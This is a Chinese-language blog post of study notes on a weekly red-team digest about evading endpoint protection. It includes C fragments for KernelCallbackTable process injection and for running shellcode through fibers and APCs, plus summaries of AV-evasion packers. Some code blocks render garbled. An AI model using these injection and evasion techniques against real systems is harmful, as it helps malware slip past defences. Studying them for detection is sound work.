@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="findream's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x01 企业级EDR绕过技术 原文名称：A blueprint for evading industry leading endpoint protection in 2022 作者主要介绍了规避现代EDR的几种常见思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绿盟科技-每周蓝军技术推送（2022.4.16-4.22）学习">
+<meta property="og:url" content="https://findream.github.io/2022/04/23/绿盟科技-每周蓝军技术推送（2022.4.16-4.22）/index.html">
+<meta property="og:site_name" content="findream&#39;s blog">
+<meta property="og:description" content="0x01 企业级EDR绕过技术 原文名称：A blueprint for evading industry leading endpoint protection in 2022 作者主要介绍了规避现代EDR的几种常见思路">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2022-05-23T11:44:41.971Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="绿盟科技-每周蓝军技术推送（2022.4.16-4.22）学习">
+<meta name="twitter:description" content="0x01 企业级EDR绕过技术 原文名称：A blueprint for evading industry leading endpoint protection in 2022 作者主要介绍了规避现代EDR的几种常见思路">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findream.github.io/2022/04/23/绿盟科技-每周蓝军技术推送（2022.4.16-4.22）/"/>
+
+
+
+
+
+  <title>绿盟科技-每周蓝军技术推送（2022.4.16-4.22）学习 | findream's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">findream's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findream.github.io/2022/04/23/绿盟科技-每周蓝军技术推送（2022.4.16-4.22）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findream">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="findream's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">绿盟科技-每周蓝军技术推送（2022.4.16-4.22）学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-04-23T14:02:11+08:00">
+                2022-04-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/攻防技术/" itemprop="url" rel="index">
+                    <span itemprop="name">攻防技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x01-企业级EDR绕过技术"><a href="#0x01-企业级EDR绕过技术" class="headerlink" title="0x01 企业级EDR绕过技术"></a>0x01 企业级EDR绕过技术</h2><ul>
+<li>原文名称：A blueprint for evading industry leading endpoint protection in 2022</li>
+<li>作者主要介绍了规避现代EDR的几种常见思路</li>
+</ul>
+<a id="more"></a>
+<h2 id="0x02-构建API调用框架绕过杀软hook"><a href="#0x02-构建API调用框架绕过杀软hook" class="headerlink" title="0x02 构建API调用框架绕过杀软hook"></a>0x02 构建API调用框架绕过杀软hook</h2><ul>
+<li><p>通常API函数调用过程如下：<br>3环API(kernel32.dll) -&gt; ntdll.dll -&gt; sysenter -&gt; KiFastCallentry -&gt; SSDT -&gt; 真正调用的0环API</p>
+</li>
+<li><p>文章作者的思路是既然应用层API调用都要经过SSDT，继而调用R0的函数，EDR产品会使用SSDT hook来监控敏感的调用。<br>所以，我们通过伪造的SSDT，来规避EDR产品检测。</p>
+</li>
+<li>作者首先通过中断门，进入R0，然后在伪造SSDT。这样的话，R3程序通过中断门，通过伪造的SSDT进入指定的内核函数。然后规避EDR。</li>
+<li>但是，这个方法比较理想化，第一：win7及以上系统无法通过中断门进入，所以，理论上这个方法只能在windowsxp下实现，第二：因为涉及到驱动文件，如何保证文件落地不被查杀，第二，如何保证驱动能被安全的加载，第三，合理有效的数字签名如何获取。<br>Ref:<a href="https://tttang.com/archive/1546/" target="_blank" rel="external">https://tttang.com/archive/1546/</a></li>
+</ul>
+<h2 id="0x03-Kernelcallbacktable-注入"><a href="#0x03-Kernelcallbacktable-注入" class="headerlink" title="0x03 Kernelcallbacktable 注入"></a>0x03 Kernelcallbacktable 注入</h2><ul>
+<li><p>KernelCallbackTable(系统回调表)是由KeUserModeCallback函数调用，每当GUI进程加载User32.dll的时候，系统就会通过PEB找到KernelCallbackTable地址，并进行初始化为函数数组，这个函数数组中的函数通常用于响应窗口消息。</p>
+</li>
+<li><p>所以，攻击者可以通过修改远程进程的KernelCallbackTable的函数数组，然后发送一个对应的窗口消息，从而实现劫持执行流。</p>
+</li>
+<li><p>本文作者参考modexpblog的思路：</p>
+<ul>
+<li><p>通过窗口获取目标进程Pid，从而获取目标进程的伪句柄。</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HANDLE hProcess = OpenProcess(<span class="name">PROCESS_ALL_ACCESS</span>, FALSE, pid)<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Process Handle: 0x%p\n"</span>, hProcess)<span class="comment">;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>通过调用<code>NtQueryInformationProcess</code>获取ProcessBasicInformation，pbi结构体中保存着Peb的地址</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PROCESS_BASIC_INFORMATION pbi<span class="comment">;</span></div><div class="line">pNtQueryInformationProcess myNtQueryInformationProcess = (<span class="name">pNtQueryInformationProcess</span>)GetProcAddress(<span class="name">GetModuleHandle</span>(<span class="name">L</span><span class="string">"ntdll.dll"</span>), <span class="string">"NtQueryInformationProcess"</span>)<span class="comment">;</span></div><div class="line">myNtQueryInformationProcess(<span class="name">hProcess</span>, ProcessBasicInformation, <span class="symbol">&amp;pbi</span>, sizeof(<span class="name">pbi</span>), NULL)<span class="comment">;</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>* 通过PEB获取KernelCallbackTable
+</code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PEB peb;</div><div class="line">ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, <span class="keyword">sizeof</span>(peb), <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] PEB Address: 0x%p\n"</span>, pbi.PebBaseAddress);</div><div class="line">KERNELCALLBACKTABLE kct;</div><div class="line">ReadProcessMemory(hProcess, peb.KernelCallbackTable, &amp;kct, <span class="keyword">sizeof</span>(kct), <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] KernelCallbackTable Address: 0x%p\n"</span>, peb.KernelCallbackTable);</div><div class="line">``` </div><div class="line">    * 将shellcode和新的KernelCallbackTable写入远程进程</div></pre></td></tr></table></figure>
+<p>LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br>kct.__fnCOPYDATA = (ULONG_PTR)payloadAddr;<br>WriteProcessMemory(hProcess, newKCTAddr, &amp;kct, sizeof(kct), NULL);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>更新一下PEB的KernelCallbackTable地址。</div></pre></td></tr></table></figure></p>
+<p>// Update the PEB<br>WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &amp;newKCTAddr, sizeof(ULONG_PTR), NULL);<br>printf(“[+] Remote process PEB updated\n”);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>最后，通过发送窗口请求，响应操作</div></pre></td></tr></table></figure></p>
+<p>COPYDATASTRUCT cds;<br>WCHAR msg[] = L”Pwn”;<br>cds.dwData = 1;<br>cds.cbData = lstrlen(msg) * 2;<br>cds.lpData = msg;<br>SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&amp;cds);<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">Adventures with KernelCallbackTable Injection</span>](<span class="link">https://captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection.html</span>)</div><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">Windows Process Injection: KernelCallbackTable used by FinFisher / FinSpy</span>](<span class="link">https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/</span>)</div><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">攻击技术研判 ｜Lazarus搭载新的载荷执行与控制流劫持技术(此处原文应该来自M01n)</span>](<span class="link">http://www.ctfiot.com/28074.html</span>)</div><div class="line"></div><div class="line"><span class="section">## 0x04 利用Exception Directory获取系统服务调用号</span></div><div class="line"><span class="bullet">* </span>这篇文章思维跳跃度太高，没太看明白。</div><div class="line"></div><div class="line"><span class="section">## 0x05 常见的PE打包器在Windows 11中的免杀测试</span></div><div class="line"><span class="bullet">* </span>这几款免杀框架主要都采用了一下技术：</div><div class="line"><span class="bullet">* </span>Loader[ScareCrow]：通过将恶意的dll注入到诸如Wscript,Msiexe等系统进程中，规避一些EDR的检测，但效果估计差强人意。</div><div class="line"><span class="bullet">* </span>Console[ScareCrow]:通常，恶意软件需要隐藏窗口是通过创建进程时，设置ldflags标志实现的，但是这很容易被EDR检测到，所以，通过GetConsoleWindow和ShowWindow实现窗口隐藏。</div><div class="line"><span class="bullet">* </span>ByPass AMSI和ETW[ScareCrow,inceptor等]:这没什么好说的，正常的都会这样做的。</div><div class="line"><span class="bullet">* </span>Delivery[ScareCrow]:这个没太看懂，应该是一种远程命令执行，或者远程数据传递的技术吧。</div><div class="line"><span class="bullet">* </span>AntiDebug[PEzor]:反调试</div><div class="line"><span class="bullet">* </span>unhook[PEzor]:移除部分用户层Hook</div><div class="line"><span class="bullet">* </span>syscalls[PEzor，Nimcrypt2等]:syscall 规避用户层Hook</div><div class="line"><span class="bullet">* </span>Shellcode和函数名加密[charlotte,FourEye,inceptor等等]</div><div class="line"><span class="bullet">* </span>API动态调用[charlotte]:charlotte所指的动态调用是指使用GetProcAddress获取函数地址后，然后调用。</div><div class="line"><span class="bullet">* </span>正常文件插入shellcode[Sh3llter,msf,cobaltstrike旧版本]：可以有效降低信息熵，但是cs在近几个版本中取消了。</div><div class="line"><span class="bullet">* </span>Fiber(纤程)和APC[FourEye，Nimcrypt2]：FourEye的这几种方法都是在处理调用shellcode如何实现免杀，常见的直接调用shellcode不容易绕过EDR。</div><div class="line"><span class="code">    * Fiber这个方案主要调用CreateFiber创建一个纤程对象，然后调用SwitchToFiber选择即可。</span></div><div class="line"><span class="code">    * APC这个方案就是调用QueueUserAPC插入一个APC到队列中</span></div><div class="line"><span class="bullet">* </span>Ntdll ByPass</div><div class="line"><span class="bullet">* </span>通过一些不常见的语言Nim来减少特征[Nimcrypt2]</div><div class="line"><span class="bullet">* </span>系统调用名称随机化[Nimcrypt2]:就是在获取API函数地址的时候，使用随机的函数名称，这样减缓分析进度。</div><div class="line"><span class="bullet">* </span>LLVM混淆[Nimcrypt2]</div></pre></td></tr></table></figure></p>
+<p>//Fiber<br>PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>memcpy(shellcodeLocation, shellcode, sizeof shellcode);<br>PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);<br>SwitchToFiber(shellcodeFiber);<br>//APC<br>char<em> buffer = (char</em>)Allocate(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>CopyMemory(buffer, shellcode, shellcode_size);<br>QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);<br>```</p>
+<ul>
+<li>===&gt;[TODO]如果要学怎么写一个免杀框架，<a href="https://github.com/klezVirus/inceptor" target="_blank" rel="external">inceptor</a>是一个很好地学习例子。</li>
+<li>Ref:<a href="https://github.com/klezVirus/inceptor" target="_blank" rel="external">https://github.com/klezVirus/inceptor</a></li>
+<li>Ref:<a href="https://assume-breach.medium.com/home-grown-red-team-testing-common-av-evasion-with-pe-packers-on-windows-11-a2a9e873fe13" target="_blank" rel="external">https://assume-breach.medium.com/home-grown-red-team-testing-common-av-evasion-with-pe-packers-on-windows-11-a2a9e873fe13</a></li>
+<li>Ref:<a href="https://www.1ight.top/纤程注入shellcode/" target="_blank" rel="external">https://www.1ight.top/纤程注入shellcode/</a></li>
+</ul>
+<h2 id="0x06-攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK"><a href="#0x06-攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK" class="headerlink" title="0x06 攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK"></a>0x06 攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK</h2><ul>
+<li>就是利用社会工程学伪装lnk执行后续恶意dll。</li>
+<li><a href="https://mp.weixin.qq.com/s/rCEoKdi-_qLWw86vZKrVWA" target="_blank" rel="external">https://mp.weixin.qq.com/s/rCEoKdi-_qLWw86vZKrVWA</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/04/20/绿盟科技-每周蓝军技术推送（2022.4.9-4.15）/" rel="next" title="绿盟科技-每周蓝军技术推送（2022.4.9-4.15）学习">
+                <i class="fa fa-chevron-left"></i> 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/05/10/绿盟科技-每周蓝军技术推送（2022.4.30-5.6)/" rel="prev" title="绿盟科技-每周蓝军技术推送（2022.4.30-5.6）学习">
+                绿盟科技-每周蓝军技术推送（2022.4.30-5.6）学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">findream</p>
+              <p class="site-description motion-element" itemprop="description">Apes--change the world's animals</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">55</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-企业级EDR绕过技术"><span class="nav-number">1.</span> <span class="nav-text">0x01 企业级EDR绕过技术</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-构建API调用框架绕过杀软hook"><span class="nav-number">2.</span> <span class="nav-text">0x02 构建API调用框架绕过杀软hook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Kernelcallbacktable-注入"><span class="nav-number">3.</span> <span class="nav-text">0x03 Kernelcallbacktable 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK"><span class="nav-number">4.</span> <span class="nav-text">0x06 攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findream</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
